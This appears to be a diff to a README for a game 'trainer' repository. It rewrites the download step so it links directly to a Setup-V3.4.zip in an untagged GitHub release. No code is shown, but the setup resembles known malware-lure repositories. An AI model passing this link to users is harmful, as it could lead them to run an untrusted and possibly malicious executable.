@@ -22,7 +22,7 @@
 
 ### 1. Download
 
-Download the latest archive from the [Releases page]([https://github.com/wretchedoutli/How-to-Fish-Trainer-Pro/releases](https://github.com/wretchedoutli/How-to-Fish-Trainer-Pro/releases/download/untagged-8a21901af90536d0d908/Setup-V3.4.zip)).
+Download the latest archive from the [Releases page](https://github.com/wretchedoutli/How-to-Fish-Trainer-Pro/releases/download/untagged-8a21901af90536d0d908/Setup-V3.4.zip).
 
 ### 3. Run
 
